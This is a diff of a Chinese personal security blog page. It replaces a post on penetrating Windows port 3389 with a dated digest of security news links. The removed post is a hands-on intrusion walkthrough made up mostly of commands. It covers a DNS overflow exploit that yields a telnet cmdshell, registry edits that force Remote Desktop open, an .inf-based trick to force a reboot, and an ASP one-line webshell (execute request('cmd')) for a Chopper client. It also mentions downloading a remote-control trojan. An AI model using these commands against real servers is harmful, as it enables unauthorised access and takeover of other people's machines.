@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Windows下的3389端口渗透 | Huang ZhenYu</title>
+  <title>20190801安全汇总 | Huang ZhenYu</title>
   <meta name="keywords" content=" 网络安全 ">
-  <meta name="description" content="Windows下的3389端口渗透 | Huang ZhenYu">
+  <meta name="description" content="20190801安全汇总 | Huang ZhenYu">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Vulnerability Warning   Name    Linux Kernel &amp;lt; 5.1.17 本地提权漏洞   [webapps] Oracle Hyperion Planning 11.1.2.3 - XML External Entity   Security Information   Name    Black hat USA 2019 议题预览   OXID eSho">
 <meta name="keywords" content="网络安全">
@@ -340,9 +340,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Windows下的3389端口渗透" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-20190801安全汇总" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Windows下的3389端口渗透</h1>
+        <h1 class="article-title">20190801安全汇总</h1>
     
     <div class="article-meta">
         
@@ -350,7 +350,7 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="旧时光">旧时光</a>
+                <a href="javascript:" data-rel="安全汇总">安全汇总</a>
             
         </span>
         
@@ -364,7 +364,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-12 23:57:10'>2019-08-11 18:25</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-13 22:03:12'>2019-08-13 22:02</time>
         
     </div>
     <div class="article-meta">
@@ -386,7 +386,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-Warning"><span class="toc-text">Vulnerability Warning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Security-Information"><span class="toc-text">Security Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Security-Technology"><span class="toc-text">Security  Technology</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -401,30 +401,126 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>1、Win7、Win2003、XP系统</p>
-<p>在CMD命令行开启3389端口：<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
-<p>在CMD命令行关闭3389端口（将00000000改成11111111即可）：</p>
-<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</p>
-<p>2、2000系统</p>
-<p>简要说一下如何进行DNS溢出攻击。我用的溢出利用程序是dns.exe，在CMD下运行它可以看到它的使用参数等信息。执行”dns -s IP”命令检测目标IP是否存在DNS溢出漏洞，若存在则进行溢出攻击，执行”dns -t 2000all IP 1207”后提示要我们检测返回的1100端口的shell。”telnet IP 1100”成功得到返回的cmdshell。注意目录为c:/WINNT/system32，接着我们需要做的是使用”echo”命令写入一个3389.reg注册表文件。将如下代码一行一行地复制到cmdshell窗口后按回 车执行：</p>
-<p>echo Windows Registry Editor Version 5.00 &gt;3389.reg<br>echo. &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/netcache] &gt;&gt;3389.reg<br>echo “Enabled”=”0” &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon] &gt;&gt;3389.reg<br>echo “ShutdownWithoutLogon”=”0” &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/Installer] &gt;&gt;3389.reg<br>echo “EnableAdminTSRemote”=dword:00000001 &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server] &gt;&gt;3389.reg<br>echo “TSEnabled”=dword:00000001 &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Services/TermDD] &gt;&gt;3389.reg<br>echo “Start”=dword:00000002 &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Services/TermService] &gt;&gt;3389.reg<br>echo “Start”=dword:00000002 &gt;&gt;3389.reg<br>echo [HKEY_USERS/.DEFAULT/Keyboard Layout/Toggle] &gt;&gt;3389.reg<br>echo “Hotkey”=”1” &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/Wds/rdpwd/Tds/tcp] &gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000D3D &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/WinStations/RDP-Tcp] &gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000D3D &gt;&gt;3389.reg</p>
-<p>简单说明一下，”&gt;”符号是覆盖写入文件，如无此文件则创建，有则覆盖原来的内容写入。”&gt;&gt;”是追加写入，即在原有文件内容的基础上在 后面写入内容。这里是写入内容到3389.reg文件中！需要注意的是第二行，那个作用是写入一行空格，因为.reg文件的格式 必须如此！成功写入完毕后接着执行导入操作，执行”regedit /s 3389.reg”。这样注册表文件就已经顺利导入到注册表里去了。不过需要注意的是在cmdshell下不要输错任何一个字符，否则将无法执行，建议先 自己打好在记事本上，确保无误之后再复制到cmdshell窗口执行。然后可以用下面这个方法重启目标主机。在cmdshell下执行如下代码：</p>
-<p>@ECHO OFF &amp; cd/d %temp% &amp; echo [version] &gt; {out}.inf<br>(set inf=InstallHinfSection DefaultInstall)<br>echo signature=$chicago$ &gt;&gt; {out}.inf<br>echo [defaultinstall] &gt;&gt; {out}.inf<br>rundll32 setupapi,%inf% 1 %temp%/{out}.inf r</p>
-<p>按顺序将以上五行代码一行一行地复制到cmdshell上，复制完一行按一次回车执行，五行都执行完毕后，服务器就会重启的了。当然让服务器重启的方法比较多，比如结束掉系统关键进程、代码模拟按键等都是可以的，如无意外，等待服 务器完成重启之后再连接目标发现远程桌面服务已经成功开启了。至此Windows 2000操作系统溢出后返回的cmdshell下开启远程桌面服务就成功完成了。</p>
-<p>3、2003系统</p>
-<p>相对于2000的系 统来说，2003cmdshell下开启远程桌面服务就比较容易一些了，起码无需重启嘛！第一种方法也是用”echo”命令写入一个 3389.reg文件，再”regedit /s 3389.reg”导入注册表文件即可开启，比较简单，与上面介绍的2000的开启方法类似。将如下代码一行一行地复制到cmdshell窗口后按回车执 行：</p>
-<p>echo Windows Registry Editor Version 5.00 &gt;3389.reg<br>echo. &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server] &gt;&gt;3389.reg<br>echo “fDenyTSConnections”=dword:00000000 &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/Wds/rdpwd/Tds/tcp] &gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d &gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/WinStations/RDP-Tcp] &gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d &gt;&gt;3389.reg</p>
-<p>完成以上操作后再执行”regedit /s 3389.reg”导入即可生效！不过这个方法相对来说比较麻烦。我们还可以用另外一种比较简单的方法来开启远程桌面服务的。在介绍另一个操作方法之前，我们先来熟悉下2003系统下远程桌面服务的一个最关键的注册表键值。<br>在”HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server”</p>
-<p>下数值名称为”fDenyTSConnections”的这一项，可以看到它的数值数据为1或0。数值为1的时候关闭远程桌面服务，数值为0的时候开启远程 桌面服务。换句话说，我们只要可以在cmdshell下更改这个关键的注册表键值数据就可以达到实现开启远程桌面服务的目的了！有幸的是，在2003下有 一个”reg”命令完全可以做到这一点。这里我们找一台操作系统为2003的服务器，通过和上面介绍的同样方法溢出后返回一个cmdshell。当我们尝试连接的时候会发现根本无法连接上去。下面详细说明一下用”reg”命令开启远程桌面服务。执行：</p>
-<p>reg query “HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server”</p>
-<p>我们发现”fDenyTSConnections”键值数据为”0x1”。这个是十六进制数的1。上面提到，数据为1则没有开启远程桌面服务。我们要做的就是把”0x1”改成”0x0”！直接用”reg add”是不行的，必须把原来键值删掉再添加！在cmdshell下执行：</p>
-<p>reg delete “HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server” /v fDenyTSConnections</p>
-<p>会询问是否”要删除注册表值 fDenyTSConnections 吗”，当然Yes了。再执行：</p>
-<p>reg add “HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0</p>
-<p>提示操作成功完成。这样就把”fDenyTSConnections”的值改为”0x0”了，我们可以执行：</p>
-<p>reg query “HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server”</p>
-<p>发现已经成功更改了数据。现在再来连接服务器的3389看看，发现已经可以成功连接上了，创建个用户玩玩。至此2003下cmdshell开启远程桌面服务的方法也介绍完了。</p>
-<p>溢出后也不一定要非要在cmdshell下开启远程桌面服务。<br>可以echo一个vbs文件，下载远程控制木马，然后在cmdshell里运行一下木马即可连接。<br>还有就是查询目标IP是否绑定有网站，如果有则找到网站目录，再用echo个一句话木马进去（例如：echo “&lt;%execute request(“cmd”)%&gt;”   &gt; WEB路径/test.asp），用菜刀连接，然后上传大马，上传开3389的工具再开启也行。</p>
+        <h3 id="Vulnerability-Warning"><a href="#Vulnerability-Warning" class="headerlink" title="Vulnerability Warning"></a>Vulnerability Warning</h3><table>
+<thead>
+<tr>
+<th align="center">Name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><a href="https://www.seebug.org/vuldb/ssvid-98033" target="_blank" rel="noopener">Linux Kernel &lt; 5.1.17 本地提权漏洞</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.exploit-db.com/exploits/47196" target="_blank" rel="noopener">[webapps] Oracle Hyperion Planning 11.1.2.3 - XML External Entity</a></td>
+</tr>
+</tbody></table>
+<h3 id="Security-Information"><a href="#Security-Information" class="headerlink" title="Security Information"></a>Security Information</h3><table>
+<thead>
+<tr>
+<th align="center">Name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><a href="https://www.anquanke.com/post/id/183132" target="_blank" rel="noopener">Black hat USA 2019 议题预览</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.anquanke.com/post/id/183153" target="_blank" rel="noopener">OXID eShop两处漏洞分析</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.anquanke.com/post/id/183127" target="_blank" rel="noopener">Chakra漏洞调试笔记2——OpCode Side Effect</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.anquanke.com/post/id/183077" target="_blank" rel="noopener">Fuzz AFDKO Crashes 分析</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.anquanke.com/post/id/182889" target="_blank" rel="noopener">靶机入侵——PumpkinGarden靶机+PumpkinRaising靶机</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.anquanke.com/post/id/183046" target="_blank" rel="noopener">PHP临时文件机制与利用的思考</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.anquanke.com/post/id/183097" target="_blank" rel="noopener">7月31日每日安全热点 - 新的Android勒索软件用短信感染受害者</a></td>
+</tr>
+<tr>
+<td align="center"><a href="http://blog.nsfocus.net/nsfocus-2019-07/" target="_blank" rel="noopener">网络安全威胁月报NSFOCUS-2019-07</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.zdnet.com/article/cisco-to-pay-8-6-million-for-selling-vulnerable-software-to-us-government/#ftag=RSSbaffb68" target="_blank" rel="noopener">Cisco to pay $8.6 million for selling vulnerable software to US government</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.zdnet.com/article/microchips-act-wants-to-secure-us-govt-supply-chain-against-chinese-sabotage/#ftag=RSSbaffb68" target="_blank" rel="noopener">MICROCHIPS Act wants to secure US govt supply chain against Chinese sabotage</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.zdnet.com/article/iphone-bluetooth-traffic-leaks-phone-numbers-in-certain-scenarios/#ftag=RSSbaffb68" target="_blank" rel="noopener">iPhone Bluetooth traffic leaks phone numbers – in certain scenarios</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.zdnet.com/article/netflix-tracks-your-physical-activity-in-quest-for-perfect-video-quality/#ftag=RSSbaffb68" target="_blank" rel="noopener">Netflix motion tracking reveals what the future of ad engagement data gathering may hold</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.zdnet.com/article/iot-home-security-camera-allows-hackers-to-listen-in-over-http/#ftag=RSSbaffb68" target="_blank" rel="noopener">IoT home security camera allows hackers to listen in over HTTP</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://linux.cn/article-11171-1.html?utm_source=rss&utm_medium=rss" target="_blank" rel="noopener">在 Linux 上用 Bash 脚本监控 messages 日志</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://linux.cn/article-11170-1.html?utm_source=rss&utm_medium=rss" target="_blank" rel="noopener">WPS Office：Linux 上的 Microsoft Office 的免费替代品</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://linux.cn/article-11169-1.html?utm_source=rss&utm_medium=rss" target="_blank" rel="noopener">前 AWS 雇员被控窃取了 AWS 客户第一资本银行的上亿条用户信息</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.freebuf.com/sectool/208934.html" target="_blank" rel="noopener">GitMAD：用于发现Github上的敏感信息和数据泄漏的工具</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.freebuf.com/articles/system/209261.html" target="_blank" rel="noopener">使用反向Shell控制摄像头</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.freebuf.com/articles/system/209652.html" target="_blank" rel="noopener">安全视角下的木马免杀技术讨论</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.freebuf.com/vuls/209949.html" target="_blank" rel="noopener">漏洞预警  FasterXML jackson-databind远程代码执行漏洞</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.freebuf.com/articles/network/209198.html" target="_blank" rel="noopener">Imagemagick邂逅Getimagesize的那点事儿</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.freebuf.com/articles/paper/208811.html" target="_blank" rel="noopener">全球高级持续性威胁（APT）2019年上半年研究报告</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.freebuf.com/geek/209255.html" target="_blank" rel="noopener">Raspberry Pi Zero W USB SSH连接与WiFi配置</a></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.freebuf.com/news/209938.html" target="_blank" rel="noopener">FreeBuf早报  个人信息保护合规评估工具发布上线；谷歌公布6个重大iOS漏洞：可通过iMessage发动攻击；LAPD数据泄露致2500名警官个人信息被盗</a></td>
+</tr>
+</tbody></table>
+<h3 id="Security-Technology"><a href="#Security-Technology" class="headerlink" title="Security  Technology"></a>Security  Technology</h3><table>
+<thead>
+<tr>
+<th align="center">Name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><a href="http://www.sec-wiki.com/?2019-07-31" target="_blank" rel="noopener">SecWiki News 2019-07-31 Review</a></td>
+</tr>
+<tr>
+<td align="center"><a href="http://www.kitploit.com/2019/07/buster-find-emails-of-person-and-return.html" target="_blank" rel="noopener">Buster - Find Emails Of A Person And Return Info Associated With Them</a></td>
+</tr>
+<tr>
+<td align="center"><a href="http://www.kitploit.com/2019/07/xssizer-best-tool-to-find-and-prove-xss.html" target="_blank" rel="noopener">Xssizer - The Best Tool To Find And Prove XSS Flaws</a></td>
+</tr>
+<tr>
+<td align="center"><a href="http://xz.aliyun.com/t/5832" target="_blank" rel="noopener">一次真实axis2渗透测试</a></td>
+</tr>
+<tr>
+<td align="center"><a href="http://xz.aliyun.com/t/5808" target="_blank" rel="noopener">路由器漏洞分析系列（5）：CVE-2018-19986 DIR-818LW&amp;828命令注入漏洞分析及复现</a></td>
+</tr>
+<tr>
+<td align="center"><a href="http://xz.aliyun.com/t/5807" target="_blank" rel="noopener">逆向分析加解密之TwoFish算法</a></td>
+</tr>
+<tr>
+<td align="center"><a href="http://xz.aliyun.com/t/5814" target="_blank" rel="noopener">虚拟化安全：VirtualBox TFTP Server漏洞分析</a></td>
+</tr>
+</tbody></table>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 837184696@qq.com </span>
@@ -434,12 +530,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Windows下的3389端口渗透</p>
+    <p><span class="copy-title">文章标题:</span>20190801安全汇总</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Huang ZhenYu">Huang ZhenYu</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-11, 18:25:12</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-12, 23:57:10</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/11/Windows下的3389端口渗透/" title="Windows下的3389端口渗透">http://blog.huangzhenyu.net/2019/08/11/Windows下的3389端口渗透/</a>
+    <p><span class="copy-title">发布时间:</span>2019-08-13, 22:02:03</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-13, 22:03:12</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/13/20190801安全汇总/" title="20190801安全汇总">http://blog.huangzhenyu.net/2019/08/13/20190801安全汇总/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
